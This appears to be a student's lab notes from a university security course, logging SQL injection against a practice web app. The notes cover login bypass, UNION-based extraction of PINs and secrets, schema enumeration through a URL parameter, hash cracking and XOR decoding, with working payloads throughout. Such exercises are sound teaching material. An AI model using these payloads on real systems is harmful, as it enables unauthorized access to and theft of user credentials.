# Task 1
Started without hints
USERNAME:PASSWORD

koubadom"# : whatever
koubadom : hrth" OR 1 = 1#
koubadom" OR 1=1# : whatever
koubadom . "' " .  "OR 1=1";#:what ever
- GOT: Wrong SQL query: SELECT username FROM users WHERE username = 'koubadom . "' " . "OR 1=1";#' AND password = SHA1(CONCAT('gregr', (SELECT salt FROM users WHERE username = 'koubadom . \"\' \" . \"OR 1=1\";#')))
koubadom . "' "; // : whatever
- GOT: Wrong SQL query: SELECT username FROM users WHERE username = 'koubadom . "' "; //' AND password = SHA1(CONCAT('weewrw', (SELECT salt FROM users WHERE username = 'koubadom . \"\' \"; //')))
same result with: 
koubadom' // as username
koubadom'; // as username

koubadom:joijge' //
Wrong SQL query: SELECT username FROM users WHERE username = 'koubadom' AND password = SHA1(CONCAT('joijge' //', (SELECT salt FROM users WHERE username = 'koubadom')))


koubadom: joijge')) OR 1 = 1


WORKED: koubadom' OR 1=1;#

BUT Welcome "komartom"


koubadom';# works fine



# Task 2
nothing' UNION SELECT pin from users WHERE username = 'koubadom';#   OR code

Wrong SQL query: SELECT username FROM users WHERE username = 'nothing' UNION SELECT code from users WHERE username = 'koubadom';#' AND password = SHA1(CONCAT('reht', (SELECT salt FROM users WHERE username = 'nothing\' UNION SELECT code from users WHERE username = \'koubadom\';#')))


koubadom' UNION SELECT pin from users;#

koubadom' UNION SELECT username from users;#

kouom' UNION SELECT username from users where username='komartom';# --> this work I am supposed to be komartom

kouom' UNION SELECT pin from users where username='komartom';# --> wrong credentials

code instead of pin --> Wrong SQL

kouom' UNION select `1` from (select 1,2,3 union select * from users where username='koubadom')eg;#

koum' union select `1` from (select 1 union select username from users where username='koubadom')eg limit 1 offset 1;#
--> that worked

column is called pin after look to assignment

koum' union select pin from users where username='koubadom';# --> wrong credentials


koubad' union select concat(username, pin) as username FROM users where username='koubadom';#


kouba' union select username from users where pin like '1%';#  --> I can crack all users

kouba' union select username from users where username='koubadom' and pin like '017%';# --> step by step

kouba' union select username from users where username='koubadom' and pin like '0170%';# --> BINGO

#Task 3

koum' union select secret from users where username='koubadom';#

TWF3PGZ74YFEJGXD - VOILA

#Task 4
record-guitar-emerge-loud

koum' union select concat(secret, username) from users where username='koubadom';#

koum' union select concat' . '(' . 'username,secret' . ')' . from users where username='koubadom';#

We should search in the system, ok

Let's use offset

https://kbe.felk.cvut.cz/index.php?offset=#

--> Message
Wrong SQL query: SELECT date_time, base64_message_xor_key AS message FROM messages WHERE username = 'koubadom' LIMIT 1 OFFSET

https://kbe.felk.cvut.cz/index.php?offset=1%20UNION%20select%20username,%20pin%20from%20u://kbe.felk.cvut.cz/index.php?offset=1%20UNION%20select%20username,%20pin%20from%20users; --> list of users and their pins (but not asci)

https://kbe.felk.cvut.cz/index.php?offset=1%20UNION%20select%20username,%20FROM_BASE64(secret)%20from%20users;
--> wrong query (used hint, forget about the first part of query)

List of sepcific attribute (username,...: https://kbe.felk.cvut.cz/index.php?offset=1%20UNION%20select%20username,%20FROM_BASE64(salt)%20from%20users;

#Task 5

Hash from db: HASH(SHA1(CONCAT(original_password, salt)))

used crack.py - 33d39 is password (working)

#Task 6
https://www.dcode.fr/sha1-hash - does not work
https://hashes.com/en/decrypt/hash - did work
https://www.google.com/search?q=fm9fytmf7q&oq=fm9fytmf7q&aqs=chrome..69i57j0i13i30l2.10430j0j7&sourceid=chrome&ie=UTF-8

#Task 7
Firstly, it is not so long (10 chars). On the other hand at first view it looks like random passwword, which is good. After googling it reveals to be old access key to windows. So rainbow table obviously includes these.

#Task 8
https://kbe.felk.cvut.cz/index.php?offset=1%20UNION%20select%20TABLE_SCHEMA,%20TABLE_NAME%20from%20INFORMATION_SCHEMA.TABLES%20where%20TABLE_NAME=%27users%27;# - schema name is 'kbe'

https://kbe.felk.cvut.cz/index.php?offset=1%20UNION%20select%20TABLE_NAME,%20TABLE_NAME%20from%20INFORMATION_SCHEMA.TABLES%20where%20TABLE_SCHEMA=%27kbe%27;# - tables are codes, messages, users

https://kbe.felk.cvut.cz/index.php?offset=1%20UNION%20select%20column_name,%20column_name%20from%20information_schema.columns%20where%20table_name=%27codes%27;# - comlumns in codes table are username, aes_encrypt_code

https://kbe.felk.cvut.cz/index.php?offset=1%20UNION%20select%20column_name,%20column_name%20from%20information_schema.columns%20where%20table_name=%27messages%27;# - columns in messages table are username, base64_message_xor_key, date_time

https://kbe.felk.cvut.cz/index.php?offset=1%20UNION%20select%20column_name,%20column_name%20from%20information_schema.columns%20where%20table_name=%27users%27;# - columns in users table are username, password, pin, secret, salt

https://kbe.felk.cvut.cz/index.php?offset=1%20UNION%20select%20concat(table_name,%20%27%20%27,column_name),%20column_name%20from%20information_schema.columns;# - list all tables and columns in db

#Task 9

https://kbe.felk.cvut.cz/index.php?offset=1%20UNION%20select%20base64_message_xor_key,base64_message_xor_key%20from%20messages%20where%20username=%27koubadom%27;# - all messages

http://icyberchef.com/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)XOR(%7B'option':'UTF8','string':'Well,%20that%5C's%20all%20for%20now.%20Stay%20tuned%20for%20the%20next%20challenges.'%7D,'Standard',false)&input=THdvZU0wZEZEVGNERVJVU2Z3b09DWDlVWDBBUUZnQUZjVXMyRFQ0YlJVWVVNUTRHUlRsZFFoSkVFQXBTTVE0ZERYOEJEVk1OTXc0TUFqcEJIZz09

xor_key_be2a_kbe_2020

#Task 9

AES
record-guitar-emerge-loud
0400A5583D7BD43AD79CE455CD9F663184BE8042467EB5A99E7E9EBCFD6510F8




